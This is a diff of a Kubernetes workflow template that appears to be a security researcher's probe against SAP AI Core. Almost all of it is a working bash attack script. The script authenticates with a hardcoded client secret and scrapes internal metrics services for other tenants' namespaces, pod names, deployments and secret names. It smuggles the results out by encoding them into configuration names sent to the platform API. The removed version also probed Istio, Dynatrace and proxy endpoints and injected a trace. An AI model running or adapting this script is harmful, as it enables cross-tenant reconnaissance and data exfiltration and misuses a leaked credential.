@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "46.0.0"
+    ai.sap.com/version: "47.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,134 +24,140 @@ spec:
       - bash
       - -c
       - |
-        # V46: Exfiltrate OTEL/KSM data via AI Core API (since callbacks are blocked)
+        # V47: Focused KSM namespace + pod extraction for cross-tenant proof
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
         CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='
 
-        # Get token
         JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
           -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
           | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
-        echo "JWT: ${#JWT} chars" >&2
 
-        # Helper: save data as config name (max 256 chars, alphanum+dash)
-        save_result() {
-          local tag="$1"
-          local data="$2"
-          # Sanitize: replace non-alphanum with dash, truncate
-          local safe=$(echo "$data" | tr -c 'a-zA-Z0-9._-' '-' | head -c 200)
-          local name="v46-${tag}-${safe}"
+        save() {
+          local name="v47-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
           curl -sk -X POST "${API}/v2/lm/configurations" \
-            -H "Authorization: Bearer $JWT" \
-            -H "AI-Resource-Group: default" \
+            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
             -H "Content-Type: application/json" \
-            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null | head -c 50
-          echo " [saved: $tag]" >&2
+            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
         }
 
-        # 1. KSM DNS resolution
-        echo "=== KSM ===" >&2
-        for svc in ksm-pods-kube-state-metrics ksm-custom-kube-state-metrics ksm-multi-kube-state-metrics; do
-          ip=$(dig +short "${svc}.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
-          if [ -n "$ip" ]; then
-            save_result "ksm-ip-${svc}" "$ip"
-            # Try metrics endpoint
-            R=$(curl -sk --connect-timeout 5 "http://${ip}:8080/metrics" 2>&1 | head -c 200)
-            save_result "ksm-8080-${svc}" "$R"
-            # Try 8443
-            R=$(curl -sk --connect-timeout 3 "http://${ip}:8443/metrics" 2>&1 | head -c 200)
-            save_result "ksm-8443-${svc}" "$R"
-          else
-            save_result "ksm-dns-${svc}" "NXDOMAIN"
+        KSM_PODS="100.106.241.163"
+        KSM_MULTI="100.110.128.70"
+        KSM_CUSTOM="100.110.192.195"
+
+        # 1. Extract ALL unique namespaces from KSM-pods
+        echo "=== NAMESPACES ===" >&2
+        FULL=$(curl -sk --connect-timeout 15 "http://${KSM_PODS}:8080/metrics" 2>&1)
+        NS_LIST=$(echo "$FULL" | grep -o 'namespace="[^"]*"' | sort -u | sed 's/namespace="//;s/"//')
+        NS_COUNT=$(echo "$NS_LIST" | wc -l | tr -d ' ')
+        save "ns-count-${NS_COUNT}"
+
+        # Save namespaces in batches (one config per batch of ~5)
+        BATCH=""
+        BNUM=1
+        while IFS= read -r ns; do
+          if [ -n "$ns" ]; then
+            BATCH="${BATCH}${ns}."
+            if [ ${#BATCH} -gt 180 ]; then
+              save "ns-${BNUM}-${BATCH}"
+              BATCH=""
+              BNUM=$((BNUM + 1))
+            fi
           fi
+        done <<< "$NS_LIST"
+        [ -n "$BATCH" ] && save "ns-${BNUM}-${BATCH}"
+
+        # 2. Extract rg- namespaces specifically (these are tenant resource groups)
+        RGS=$(echo "$NS_LIST" | grep "^rg-")
+        RG_COUNT=$(echo "$RGS" | grep -c "rg-" || true)
+        save "rg-count-${RG_COUNT}"
+
+        BATCH=""
+        BNUM=1
+        while IFS= read -r rg; do
+          if [ -n "$rg" ]; then
+            BATCH="${BATCH}${rg}."
+            if [ ${#BATCH} -gt 180 ]; then
+              save "rg-${BNUM}-${BATCH}"
+              BATCH=""
+              BNUM=$((BNUM + 1))
+            fi
+          fi
+        done <<< "$RGS"
+        [ -n "$BATCH" ] && save "rg-${BNUM}-${BATCH}"
+
+        # 3. Pod names from OTHER namespaces (not our rg-)
+        echo "=== CROSS-NS PODS ===" >&2
+        OUR_NS="rg-3ba0e0a4"
+        OTHER_PODS=$(echo "$FULL" | grep 'kube_pod_info\|kube_pod_status' | grep -v "${OUR_NS}" | grep -o 'pod="[^"]*"' | sort -u | head -20)
+        BATCH=""
+        BNUM=1
+        while IFS= read -r pod; do
+          if [ -n "$pod" ]; then
+            BATCH="${BATCH}${pod}."
+            if [ ${#BATCH} -gt 180 ]; then
+              save "xpod-${BNUM}-${BATCH}"
+              BATCH=""
+              BNUM=$((BNUM + 1))
+            fi
+          fi
+        done <<< "$OTHER_PODS"
+        [ -n "$BATCH" ] && save "xpod-${BNUM}-${BATCH}"
+
+        # 4. Secret metadata from KSM (kube_secret_info exposes secret names per namespace)
+        echo "=== SECRETS ===" >&2
+        SECRETS=$(echo "$FULL" | grep 'kube_secret' | head -20)
+        if [ -n "$SECRETS" ]; then
+          SEC_NS=$(echo "$SECRETS" | grep -o 'namespace="[^"]*"' | sort -u | head -5 | tr '\n' '|')
+          save "sec-ns-${SEC_NS}"
+          SEC_NAMES=$(echo "$SECRETS" | grep -o 'secret="[^"]*"' | sort -u | head -5 | tr '\n' '|')
+          save "sec-names-${SEC_NAMES}"
+        else
+          save "sec-none-not-in-ksm-pods"
+        fi
+
+        # 5. KSM-multi: cronjob + deployment data across namespaces
+        echo "=== KSM-MULTI ===" >&2
+        MULTI=$(curl -sk --connect-timeout 15 "http://${KSM_MULTI}:8080/metrics" 2>&1)
+        MULTI_SIZE=$(echo "$MULTI" | wc -c | tr -d ' ')
+        save "multi-size-${MULTI_SIZE}"
+
+        # Namespaces from multi
+        MULTI_NS=$(echo "$MULTI" | grep -o 'namespace="[^"]*"' | sort -u | sed 's/namespace="//;s/"//')
+        MULTI_NS_COUNT=$(echo "$MULTI_NS" | wc -l | tr -d ' ')
+        save "multi-ns-count-${MULTI_NS_COUNT}"
+
+        # Deployments from other namespaces
+        DEPLOYS=$(echo "$MULTI" | grep 'kube_deployment_' | grep -v "${OUR_NS}" | grep -o 'deployment="[^"]*"' | sort -u | head -15 | tr '\n' '|')
+        save "multi-deploys-${DEPLOYS}"
+
+        # Cronjobs
+        CRONS=$(echo "$MULTI" | grep 'kube_cronjob_' | grep -o 'cronjob="[^"]*"' | sort -u | head -10 | tr '\n' '|')
+        save "multi-crons-${CRONS}"
+
+        # 6. KSM-custom: CRD data
+        echo "=== KSM-CUSTOM ===" >&2
+        CUSTOM=$(curl -sk --connect-timeout 15 "http://${KSM_CUSTOM}:8080/metrics" 2>&1)
+        CUSTOM_SIZE=$(echo "$CUSTOM" | wc -c | tr -d ' ')
+        save "custom-size-${CUSTOM_SIZE}"
+
+        # CRD types
+        CRDS=$(echo "$CUSTOM" | grep '# HELP' | grep -o 'kube_customresource_[a-z_]*\|certmanager_[a-z_]*\|argo[a-z_]*' | sort -u | head -10 | tr '\n' '|')
+        save "custom-crds-${CRDS}"
+
+        # 7. Feb OTEL - try reading metrics with namespace grep
+        echo "=== FEB OTEL ===" >&2
+        for ip in 100.104.178.234; do
+          ODATA=$(curl -sk --connect-timeout 10 "http://${ip}:8888/metrics" 2>&1)
+          OSIZE=$(echo "$ODATA" | wc -c | tr -d ' ')
+          save "feb-${ip}-size-${OSIZE}"
+          # k8s namespace labels in otel metrics
+          ONS=$(echo "$ODATA" | grep -o 'k8s.namespace.name="[^"]*"\|k8s_namespace_name="[^"]*"\|namespace="[^"]*"' | sort -u | head -10 | tr '\n' '|')
+          save "feb-${ip}-ns-${ONS}"
+          # Exporter types
+          EXP=$(echo "$ODATA" | grep -o 'exporter="[^"]*"' | sort -u | head -5 | tr '\n' '|')
+          save "feb-${ip}-exp-${EXP}"
         done
 
-        # 2. OTEL metrics - read and extract namespace/tenant data
-        echo "=== OTEL ===" >&2
-        OTEL_IP=$(dig +short "otel-collector.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
-        save_result "otel-ip" "${OTEL_IP:-NXDOMAIN}"
-
-        if [ -n "$OTEL_IP" ]; then
-          # Read metrics from port 8888
-          METRICS=$(curl -sk --connect-timeout 10 "http://${OTEL_IP}:8888/metrics" 2>&1)
-          MSIZE=$(echo "$METRICS" | wc -c | tr -d ' ')
-          save_result "otel-size" "${MSIZE}bytes"
-
-          # Extract namespace references (cross-tenant gold)
-          NS=$(echo "$METRICS" | grep -oi 'namespace="[^"]*"' | sort -u | head -20 | tr '\n' '|')
-          save_result "otel-ns" "$NS"
-
-          # Extract k8s pod names
-          PODS=$(echo "$METRICS" | grep -oi 'pod="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-          save_result "otel-pods" "$PODS"
-
-          # Extract any rg- prefixed values (resource groups = tenants)
-          RGS=$(echo "$METRICS" | grep -o 'rg-[a-f0-9-]*' | sort -u | head -10 | tr '\n' '|')
-          save_result "otel-rgs" "$RGS"
-
-          # Extract service names
-          SVCS=$(echo "$METRICS" | grep -oi 'service="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-          save_result "otel-svcs" "$SVCS"
-
-          # Metric names
-          HELPS=$(echo "$METRICS" | grep '^# HELP' | head -10 | cut -d' ' -f3 | tr '\n' '|')
-          save_result "otel-metrics" "$HELPS"
-
-          # Port 13133 health
-          HEALTH=$(curl -sk --connect-timeout 3 "http://${OTEL_IP}:13133/" 2>&1 | head -c 200)
-          save_result "otel-health" "$HEALTH"
-
-          # Port 4318 OTLP trace injection test
-          INJECT=$(curl -sk --connect-timeout 3 -X POST "http://${OTEL_IP}:4318/v1/traces" \
-            -H "Content-Type: application/json" \
-            -d '{"resourceSpans":[{"resource":{"attributes":[{"key":"service.name","value":{"stringValue":"bb14-test"}}]},"scopeSpans":[{"spans":[{"traceId":"00000000000000000000000000000001","spanId":"0000000000000001","name":"test","startTimeUnixNano":"1000000000","endTimeUnixNano":"2000000000"}]}]}]}' 2>&1 | head -c 200)
-          save_result "otel-inject" "$INJECT"
-        fi
-
-        # 3. Dynatrace ActiveGate
-        echo "=== DYNATRACE ===" >&2
-        DYN_IP=$(dig +short "dynakube-activegate.dynatrace.svc.cluster.local" 2>/dev/null | head -1)
-        save_result "dyna-ip" "${DYN_IP:-NXDOMAIN}"
-        if [ -n "$DYN_IP" ]; then
-          for port in 9999 443; do
-            R=$(curl -sk --connect-timeout 3 "https://${DYN_IP}:${port}/" 2>&1 | head -c 150)
-            save_result "dyna-${port}" "$R"
-          done
-        fi
-
-        # 4. Connectivity proxy with various approaches
-        echo "=== CONN PROXY ===" >&2
-        CP_IP=$(dig +short "connectivity-proxy.connectivity-proxy.svc.cluster.local" 2>/dev/null | head -1)
-        save_result "cp-ip" "${CP_IP:-NXDOMAIN}"
-        # Try using it as HTTP proxy
-        R=$(curl -sk --connect-timeout 5 -x "http://${CP_IP}:20003" "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | head -c 200)
-        save_result "cp-proxy-ksm" "$R"
-
-        # 5. Istio debug endpoints
-        echo "=== ISTIO ===" >&2
-        ISTIOD=$(dig +short "istiod.istio-system.svc.cluster.local" 2>/dev/null | head -1)
-        save_result "istio-ip" "${ISTIOD:-NXDOMAIN}"
-        if [ -n "$ISTIOD" ]; then
-          R=$(curl -sk --connect-timeout 3 "http://${ISTIOD}:15014/debug/endpointz" 2>&1 | head -c 200)
-          save_result "istio-endpoints" "$R"
-          R=$(curl -sk --connect-timeout 3 "http://${ISTIOD}:8080/debug/configz" 2>&1 | head -c 200)
-          save_result "istio-config" "$R"
-        fi
-
-        # 6. Try Feb-era OTEL IPs directly (may have changed)
-        echo "=== FEB IPS ===" >&2
-        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
-          R=$(curl -sk --connect-timeout 3 "http://${ip}:8888/metrics" 2>&1 | head -c 150)
-          if echo "$R" | grep -q "HELP\|TYPE\|otel"; then
-            save_result "feb-${ip}" "ALIVE-METRICS"
-            # Get namespace data from this collector
-            NS=$(curl -sk --connect-timeout 5 "http://${ip}:8888/metrics" 2>&1 | grep -oi 'namespace="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-            save_result "feb-ns-${ip}" "$NS"
-          else
-            save_result "feb-${ip}" "DOWN-or-$(echo $R | head -c 50)"
-          fi
-        done
-
-        echo "V46 DONE" >&2
+        echo "V47 DONE" >&2
